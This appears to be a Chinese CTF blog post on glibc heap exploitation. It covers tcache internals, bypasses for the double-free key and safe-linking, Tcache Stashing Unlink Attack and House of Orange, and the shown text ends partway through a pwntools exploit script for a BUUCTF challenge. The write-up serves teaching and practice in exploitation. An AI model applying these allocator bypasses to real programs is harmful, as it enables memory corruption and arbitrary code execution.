<h4 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a><strong>tcache_perthread_struct</strong></h4><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* There is one of these for each thread, which contains the</span><br><span class="hljs-comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span><br><span class="hljs-comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span><br><span class="hljs-comment">   are redundant (we could have just counted the linked list each</span><br><span class="hljs-comment">   time), this is for performance reasons.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">char</span> counts[TCACHE_MAX_BINS]; <br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> TCACHE_MAX_BINS                64</span><br><br><span class="hljs-keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="hljs-literal">NULL</span>;<br></code></pre></td></tr></table></figure>

<ul>
<li><code>tcache_prethread_struct</code> 是整个 tcache 的管理结构，其中有 64 项 entries。每个 entries 管理了若干个大小相同的 chunk，用单向链表 (<code>tcache_entry</code>) 的方式连接释放的 chunk，这一点上和 fastbin 很像</li>
<li>每个 thread 都会维护一个 <code>tcache_prethread_struct</code></li>
<li><code>tcache_prethread_struct</code> 中的 <code>counts</code> 记录 <code>entries</code> 中每一条链上 chunk 的数目，每条链上最多可以有 7 个 chunk</li>
<li>tcache_entry用于链接 chunk 结构体，其中的next指针指向下一个大小相同的 chunk<ul>
<li>这里与 fastbin 不同的是 fastbin 的 fd 指向 chunk 开头的地址，而 tcache 的 next 指向 user data 的地方，即 chunk header 之后</li>
</ul>
</li>
</ul>
<p>简单来说：就是类似fastbin一样的东西，每条链上最多可以有 7 个 chunk，free堆块的时候优先放入tcache中，满了才放入fastbin，unsorted bin，malloc的时候优先去tcache找（tcache的范围是 [0x20, 0x410]，超过这个大小的就会放入unsorted bin）</p>
<p>tcache dup：因为前几个版本的 <code>tcache bin</code>是缺乏校验机制的，即使对<code>tcache bin chunk</code>重复释放，也不会引发任何异常。比<code>fastbin chunk</code>的约束更少，一来不检查size域，二来也不检查是否重复释放</p>
<p><code>tcache_perthread_struct</code>这个结构体是可以释放的，并且可以将它释放到<code>unsorted bin</code>中去（前提是先修改0x250大小堆块的count为7），然后分配这个<code>unsorted bin chunk</code>，可以控制任意地址分配堆内存。</p>
<h3 id="高版本Tcache"><a href="#高版本Tcache" class="headerlink" title="高版本Tcache"></a>高版本Tcache</h3><p>一、在libc-2.29.so及以上的版本往tcache结构体添加了一个<code>key</code>来防止double free，判断条件就是tcache_entry的key指针（被释放堆块的bk指针位置上填入tcache的地址）是否等于<strong>tcache bin</strong>的地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-comment">/* This field exists to detect double frees.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span> *<span class="hljs-title">key</span>;</span><br>&#125; tcache_entry;<br></code></pre></td></tr></table></figure>

<p>绕过：利用UAF或者溢出等等，修改被释放堆块next指针</p>
<p>以及Stash机制：</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><code class="hljs reasonml"> <span class="hljs-keyword">if</span> ((unsigned long)(nb) &lt;= (unsigned long)(get<span class="hljs-constructor">_max_fast()</span>)) <span class="hljs-comment">//size在fastbin范围内</span><br>  &#123;<br>    idx = fastbin<span class="hljs-constructor">_index(<span class="hljs-params">nb</span>)</span>;<br>    mfastbinptr *fb = &amp;fastbin(av, idx);<br>    mchunkptr pp;<br>    victim = *fb;<br> <br>    <span class="hljs-keyword">if</span> (victim != NULL) <span class="hljs-comment">//如果有chunk</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>        *fb = victim-&gt;fd; <span class="hljs-comment">//取出头chunk</span><br>      <span class="hljs-keyword">else</span><br>        <span class="hljs-constructor">REMOVE_FB(<span class="hljs-params">fb</span>, <span class="hljs-params">pp</span>, <span class="hljs-params">victim</span>)</span>;<br> <br>      <span class="hljs-keyword">if</span> (<span class="hljs-constructor">__glibc_likely(<span class="hljs-params">victim</span> != NULL)</span>) <br>      &#123;<br>        size_t victim_idx = fastbin<span class="hljs-constructor">_index(<span class="hljs-params">chunksize</span>(<span class="hljs-params">victim</span>)</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-constructor">__builtin_expect(<span class="hljs-params">victim_idx</span> != <span class="hljs-params">idx</span>, 0)</span>) <span class="hljs-comment">//对fastbin的size检查</span><br>          malloc<span class="hljs-constructor">_printerr(<span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>)</span>;<br>        check<span class="hljs-constructor">_remalloced_chunk(<span class="hljs-params">av</span>, <span class="hljs-params">victim</span>, <span class="hljs-params">nb</span>)</span>;<br> <br>#<span class="hljs-keyword">if</span> <span class="hljs-number">1</span> <span class="hljs-comment">//if USE_TCACHE，Stash过程：把剩下的放入Tcache中</span><br>        <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">		 stash them in the tcache.  */</span><br>        size_t tc_idx = csize2tidx(nb);<br>        <span class="hljs-keyword">if</span> (tcache<span class="hljs-operator"> &amp;&amp; </span>tc_idx &lt; mp_.tcache_bins) <span class="hljs-comment">//如果属于tcache管辖范围</span><br>        &#123;<br>          mchunkptr tc_victim;<br> <br>          <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks.  */</span><br>          <span class="hljs-keyword">while</span> (tcache-&gt;counts<span class="hljs-literal">[<span class="hljs-identifier">tc_idx</span>]</span> &lt; mp_.tcache_count<span class="hljs-operator"> &amp;&amp; </span>(tc_victim = *fb) != NULL) <span class="hljs-comment">//只要tcache没空，并且fastbin还有chunk</span><br>          &#123;<br>            <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)  <span class="hljs-comment">//那么就从fastbin中取出</span><br>              *fb = tc_victim-&gt;fd;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>              <span class="hljs-constructor">REMOVE_FB(<span class="hljs-params">fb</span>, <span class="hljs-params">pp</span>, <span class="hljs-params">tc_victim</span>)</span>;<br>              <span class="hljs-keyword">if</span> (<span class="hljs-constructor">__glibc_unlikely(<span class="hljs-params">tc_victim</span> <span class="hljs-operator">==</span> NULL)</span>)<br>                break;<br>            &#125;<br>            tcache<span class="hljs-constructor">_put(<span class="hljs-params">tc_victim</span>, <span class="hljs-params">tc_idx</span>)</span>;<span class="hljs-comment">//然后放入tcache中</span><br>          &#125;<br>        &#125;<br>#endif<br>        void *p = chunk2mem(victim);<br>        alloc<span class="hljs-constructor">_perturb(<span class="hljs-params">p</span>, <span class="hljs-params">bytes</span>)</span>;<br>        return p;<br>      &#125;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure>

<p>当一个线程申请0x50大小的chunk时，如果tcache没有，那么就会进入分配区进行处理，如果对应bin中存在0x50的chunk，除了取出并返回之外，ptmalloc会认为这个线程在将来还需要相同的大小的chunk，因此就会把对应bin中0x50的chunk尽可能的放入tcache的链表中去</p>
<p>这么做会存在一些问题，对于比较典型的 fastbin double free 产生了一个很有趣的影响：</p>
<p>首先需要先释放7个chunk，填满tcache，然后Free(C7) Free(C8) Free(C7)，在fastbin中构造出环</p>
<p>下一步，为了分配到fastbin，需要先申请7个，让Tcache为空，再次申请时就会使用fastbin中的C7，这一步是整个手法的精华。取出C7后，Stash会把fastbin链表中的chunk全部放入Tcache中，而C7又是被我们分配到的堆块，是可控的，这就导致我们不需要伪造size字段，获得了一个真正的任意写。</p>
<p>二、在<code> libc-2.32.so</code>版本中新加入了一个 key 会对 tcache next 的内容进行异或</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> __always_inline <span class="hljs-keyword">void</span> </span><br><span class="hljs-function"><span class="hljs-title">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-keyword">size_t</span> tc_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>  <span class="hljs-comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="hljs-comment">     detect a double free.  */</span><br>  e-&gt;key = tcache;<br>  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]); <span class="hljs-comment">//不是直接赋值next</span><br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">static</span> __always_inline <span class="hljs-keyword">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">tcache_get</span> <span class="hljs-params">(<span class="hljs-keyword">size_t</span> tc_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);<br>  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);<br>  --(tcache-&gt;counts[tc_idx]);<br>  e-&gt;key = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *) e;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Safe-Linking:</span><br><span class="hljs-comment">Use randomness from ASLR (mmap_base) to protect single-linked lists</span><br><span class="hljs-comment">of Fast-Bins and TCache.  That is, mask the &quot;next&quot; pointers of the</span><br><span class="hljs-comment">lists&#x27; chunks, and also perform allocation alignment checks on them.</span><br><span class="hljs-comment">This mechanism reduces the risk of pointer hijacking, as was done with</span><br><span class="hljs-comment">Safe-Unlinking in the double-linked lists of Small-Bins.</span><br><span class="hljs-comment">It assumes a minimum page size of 4096 bytes (12 bits).  Systems with</span><br><span class="hljs-comment">larger pages provide less entropy, although the pointer mangling</span><br><span class="hljs-comment">still works.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PROTECT_PTR(pos, ptr) \</span><br><span class="hljs-meta">((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span><br></code></pre></td></tr></table></figure>

<p>PROTECT_PTR：对 pos 右移了 12 位（去除了末尾的 3 位十六进制信息），再异或ptr。</p>
<p>即：被释放堆块fd=(被释放堆块fd所在地址&gt;&gt;12)^被释放堆块的前一个堆块fd所在地址。</p>
<p>而这里的 <strong>key 就是储存内容的指针（在代码中叫做 pos）</strong>，在放入的时候让内容与这个 <strong>key</strong> 进行异或再储存，在取出的时候让内容与这个 <strong>key</strong> 进行异或再取出。而得益于这个秘钥就是储存内容的指针，所以无需使用其他空间来放置这个 <strong>key</strong> 的内容，只需要保存异或之后的内容，在解密时只需 <strong>PROTECT_PTR (&amp;ptr, ptr)</strong> 这样操作即可。</p>
<p>需要注意的是，当 tcache 中只有一个元素的时候，也就是在放入这个元素的过程中，<strong>tcache-&gt;entries[tc_idx] == 0</strong>，在这个时候放入元素的时候会异或 0，也就是在 <strong>e-&gt;next 位置存放</strong>的内容正好就是 <strong>key 的信息</strong>，因为 <strong>key 异或 0 还是秘钥</strong>。而且就算之后加入了其他的元素，这个元素始终还是在链表的尾部，所以内容不会发生变化</p>
<p>绕过：</p>
<ul>
<li>通过 0 异或秘钥还是秘钥的这个特性，当 tcache 链上只有一个指针的时候，我们就可以通过 show 函数来 leak 出秘钥的信息，有了秘钥的信息之后，我们就可以伪造秘钥信息了</li>
<li>可以通过 largebin 来泄露堆地址，由于 key 是当前指针 &gt;&gt; 12，所以我们可以确保在 4096 字节内这个 key 都是正确的</li>
</ul>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="一、泄露堆基址"><a href="#一、泄露堆基址" class="headerlink" title="一、泄露堆基址"></a>一、泄露堆基址</h4><p>构造两个相同 size 的堆块 a 和 b，我们先 free (a) 让他进入到 tcache 中，再 free (b) 也让他进入到 tcache 中。这时候，在堆块 b 的 fd 位置就存在着堆块 a 的地址，我们 leak 出来就能够得到堆地址</p>
<h2 id="libc-2-29-so"><a href="#libc-2-29-so" class="headerlink" title="libc-2.29.so"></a>libc-2.29.so</h2><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (size &lt;= <span class="hljs-number">2</span> * SIZE_SZ) || __glibc_unlikely (size &gt; av-&gt;system_mem)) 				malloc_printerr (<span class="hljs-string">&quot;malloc: invalid size (unsorted)&quot;</span>); <br><span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="hljs-number">2</span> * SIZE_SZ) || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem)) <br>    malloc_printerr (<span class="hljs-string">&quot;malloc: invalid next size (unsorted)&quot;</span>); <br><span class="hljs-keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size)) <br>    malloc_printerr (<span class="hljs-string">&quot;malloc: mismatching next-&gt;prev_size (unsorted)&quot;</span>); <br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim) || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av))) 		malloc_printerr (<span class="hljs-string">&quot;malloc: unsorted double linked list corrupted&quot;</span>);<br><span class="hljs-keyword">if</span> (__glibc_unlikely (prev_inuse (next))) <br>    malloc_printerr (<span class="hljs-string">&quot;malloc: invalid next-&gt;prev_inuse (unsorted)&quot;</span>); ...... ...... <span class="hljs-comment">/* remove from unsorted list */</span> <span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc: corrupted unsorted chunks 3&quot;</span>);<br>	unsorted_chunks (av)-&gt;bk = bck; <br>	bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure>

<ul>
<li><p>对于<code>unsortbin</code>的解链添加了验证链完整性的检查，让 <code>unsortbin attack</code>失效</p>
<ul>
<li><p>绕过：</p>
<p>1.largebin中的chunk-&gt;fd_nextsize=0;</p>
<p>2.largebin中的chunk-&gt;bk_nextsize可控制;</p>
<p>3.unsortedbin里的chunk大于largebin，并且如果进入largebin，是同一个index。</p>
</li>
</ul>
</li>
</ul>
<h3 id="Tcache-Stashing-Unlink-Attack"><a href="#Tcache-Stashing-Unlink-Attack" class="headerlink" title="Tcache Stashing Unlink Attack"></a>Tcache Stashing Unlink Attack</h3><p>类unlink手法，高版本一样可用，至少目前我知道的：到 libc-2.32 是没问题的</p>
<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>1.<code>smallbin</code>中可以控制大小为size块的bk指针</p>
<p>2.<code>tcache</code>中大小为size块的个数为6</p>
<p>3.申请堆块是<code>calloc</code></p>
<h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><ul>
<li>释放6个0x100的chunk到tcache bin中</li>
<li>构造两个0x100的small bin（利用Unsorted bin或Large bin切割得到）</li>
<li>修改后插入的small bin的 bk 指针为目标地址-0x10，且保持fd指针不变</li>
<li>用calloc分配0x100的chunk</li>
</ul>
<h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><ul>
<li>在目标地址上写入原本small bin上的 bk 指针内容</li>
</ul>
<h2 id="libc-2-32-so"><a href="#libc-2-32-so" class="headerlink" title="libc-2.32.so"></a>libc-2.32.so</h2><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (SINGLE_THREAD_P)  <br>&#123;<br>    <span class="hljs-comment">/* Check that the top of the bin is not the record we are going to</span><br><span class="hljs-comment">        add (i.e., double free).  */</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect(old == p, <span class="hljs-number">0</span>))<br>        malloc_printerr(<span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>);<br>    p-&gt;fd = PROTECT_PTR(&amp;p-&gt;fd, old);<br>    *fb = p;<br>&#125;<br><span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">do</span><br>    &#123;<br>        <span class="hljs-comment">/* Check that the top of the bin is not the record we are going to</span><br><span class="hljs-comment">            add (i.e., double free).  */</span><br>        <span class="hljs-keyword">if</span> (__builtin_expect(old == p, <span class="hljs-number">0</span>))<br>            malloc_printerr(<span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>);<br>        old2 = old;<br>        p-&gt;fd = PROTECT_PTR(&amp;p-&gt;fd, old);<br>    &#125; <span class="hljs-keyword">while</span> ((old = catomic_compare_and_exchange_val_rel(fb, p, old2))<br>        != old2);<br></code></pre></td></tr></table></figure>

<p>上面是glibc2.32下的fastbin源码，同样存在跟tcache一样的保护机制，会对 fd 指针进行异或处理</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>由于这个检测的存在，我们 tcache 申请的地址似乎要做到 0x10 对齐（x64）</p>
<h2 id="libc-2-34-so"><a href="#libc-2-34-so" class="headerlink" title="libc-2.34.so"></a>libc-2.34.so</h2><p>该版本删除了各种 hook 函数，所以要更换思路，一般可以通过 FSOP 攻击输出流的函数虚表 </p>
]]></content>
      <tags>
        <tag>glibc</tag>
      </tags>
  </entry>
  <entry>
    <title>house of系列</title>
    <url>/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/</url>
    <content><![CDATA[<p> 该系列内容较多，将会持续更新</p>
<h2 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a>House of Roman</h2><p>爆破概率太低，不建议使用，了解一下利用思路即可</p>
<h2 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h2><p>版本 glibc-2.24及以下。</p>
<p>先介绍一下一个重点知识：如果在分配堆块时， top chunk 不够分配，那么根据申请的大小，会通过sysmalloc 来分配，如果申请的大小小于mmap的阀值的话，就会扩展top chunk，将old top chunk free掉，如果大于的话，就会通过mmap申请一块新的堆块。所以可以通过把 top chunk size 改小这种方式让 top chunk 进入unsorted bin 中，从而产生 libc 地址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (av == <span class="hljs-literal">NULL</span><br>    || ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (mp_.mmap_threshold)<br>        &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))<span class="hljs-comment">/*这里进行判断，判断分配的大小是否大于mmap分配的阀值，如果大于就是用mmap从新分配一个堆块，否则就会扩展top chunk*/</span><br>  &#123;<br>    <span class="hljs-keyword">char</span> *mm;           <span class="hljs-comment">/* return value from mmap call*/</span><br>  try_mmap:<br>  <br>  .........<br>  ..........<br>    <span class="hljs-keyword">if</span> (old_size != <span class="hljs-number">0</span>)<br>                  &#123;<br>                    <span class="hljs-comment">/*</span><br><span class="hljs-comment">                       Shrink old_top to insert fenceposts, keeping size a</span><br><span class="hljs-comment">                       multiple of MALLOC_ALIGNMENT. We know there is at least</span><br><span class="hljs-comment">                       enough space in old_top to do this.</span><br><span class="hljs-comment">                     */</span><br>                    old_size = (old_size - <span class="hljs-number">4</span> * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;<br>                    set_head (old_top, old_size | PREV_INUSE);<br>                    set_head (chunk_at_offset (old_top, old_size),<br>                              (<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);<br>                    set_head (chunk_at_offset (old_top, old_size + <span class="hljs-number">2</span> * SIZE_SZ),<br>                              (<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);<br>                    <span class="hljs-comment">/* If possible, release the rest. */</span><br>                    <span class="hljs-keyword">if</span> (old_size &gt;= MINSIZE)<br>                      &#123;<br>                        _int_free (av, old_top, <span class="hljs-number">1</span>);<span class="hljs-comment">/*将old top chunk free掉，加入unsorted bin*/</span><br>                      &#125;<br>                  &#125;<br></code></pre></td></tr></table></figure>

<p>house of orange 利用过程：</p>
<p>修改一个 unsorted chunk 的size字段为0x60，利用 unsorted bin attack 将 _IO_list_all 修改为 main_arena+0x58，而IO_list_all 中的 *chain 指针位于 _IO_list_all + 0x68 的位置：即main_arena + 0x58 + 0x68 是 small bin中大小为0x60的位置，所以需要将 chunk 的size修改为0x60，让该 chunk 链入 small bin 的相应位置上，在其上布置好伪造的 _IO_FILE_plus，那么就形成了一个伪造的 chain 链。伪造这些后，只要再分配一个chunk，就会触发malloc_printerr，会遍历IO_llist_all，最终调用 IO_overflow函数</p>
<p>malloc_printerr：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>           || __builtin_expect (chunksize_nomask (victim)<br>                                &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>         malloc_printerr (<span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>触发 malloc_printerr 后，会形成下列调用链：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">mallloc_printerr-&gt; __libc_message—&gt;<span class="hljs-built_in">abort</span>-&gt;flush-&gt;_IO_flush_all_lock-&gt;_IO_OVERFLOW<br>而_IO_OVERFLOW最后会调用vtable表中的__overflow 函数<br></code></pre></td></tr></table></figure>

<p>_IO_flush_all_lockp：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">_IO_flush_all_lockp (<span class="hljs-keyword">int</span> do_lock)<br>&#123;<br>  <span class="hljs-keyword">int</span> result = <span class="hljs-number">0</span>;<br>  FILE *fp;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  _IO_cleanup_region_start_noarg (flush_cleanup);<br>  _IO_lock_lock (list_all_lock);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>  <span class="hljs-keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="hljs-literal">NULL</span>; fp = fp-&gt;_chain)<br>    &#123;<br>      run_fp = fp;<br>      <span class="hljs-keyword">if</span> (do_lock)<br>        _IO_flockfile (fp);<br>      <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<span class="hljs-comment">/*一些检查，需要绕过*/</span><br>           || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>               &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>                                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<span class="hljs-comment">/*也可以绕过这个*/</span><br>           )<br>          &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<span class="hljs-comment">/*遍历_IO_list_all ，选出_IO_FILE作为_IO_OVERFLOW的参数，执行函数*/</span><br>        result = EOF;<br>      <span class="hljs-keyword">if</span> (do_lock)<br>        _IO_funlockfile (fp);<br>      run_fp = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  _IO_lock_unlock (list_all_lock);<br>  _IO_cleanup_region_end (<span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>所以伪造的 _IO_FILE_plus 要通过下列检查：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-number">1.</span>((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<br><br>或者是<br><span class="hljs-number">2.</span><br>_IO_vtable_offset (fp) == <span class="hljs-number">0</span> <br>&amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> <br>&amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)<br></code></pre></td></tr></table></figure>

<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>来自buu的题目，程序不存在 delete 函数，无法释放堆块，所以要用到前面的修改 top chunk size 的方法，从而得到 libc 地址。</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20220313210805600.png"><span class="image-caption">image-20220313210805600</span></p>
<p>漏洞点在于 edit 函数，对于写入的个数没做严格的限制，可以写入大于申请堆块长度的内容，从而存在堆溢出。</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20220313210907191.png"><span class="image-caption">image-20220313210907191</span></p>
<p>伪造 IO_FILE_plus 后的成果如下：</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20220313170817299.png"><span class="image-caption">image-20220313170817299</span></p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20220313170916290.png"><span class="image-caption">image-20220313170916290</span></p>
<p>最终只能在本地getshell</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20220313173210640.png"><span class="image-caption">image-20220313173210640</span></p>
<p>远程一直都是显示 dumped core</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20220313173230192.png"><span class="image-caption">image-20220313173230192</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./house_of_orange&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">26547</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br>	<span class="hljs-comment">#gdb.attach(p,&quot;b *$rebase(0x)&quot;)</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size, content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Length of name :&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;Name :&quot;</span>)<br>    p.send(content)<br>    p.recvuntil(<span class="hljs-string">&quot;Price of Orange:&quot;</span>)<br>    p.send(<span class="hljs-built_in">str</span>(<span class="hljs-number">520</span>))<br>    p.recvuntil(<span class="hljs-string">&quot;Color of Orange:&quot;</span>)<br>    p.send(<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>    <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;: &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Length of name :&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    p.recvuntil(<span class="hljs-string">&quot;Name:&quot;</span>)<br>    p.send(content)<br>    p.recvuntil(<span class="hljs-string">&quot;Price of Orange:&quot;</span>)<br>    p.send(<span class="hljs-built_in">str</span>(<span class="hljs-number">520</span>))<br>    p.recvuntil(<span class="hljs-string">&quot;Color of Orange:&quot;</span>)<br>    p.send(<span class="hljs-built_in">str</span>(<span 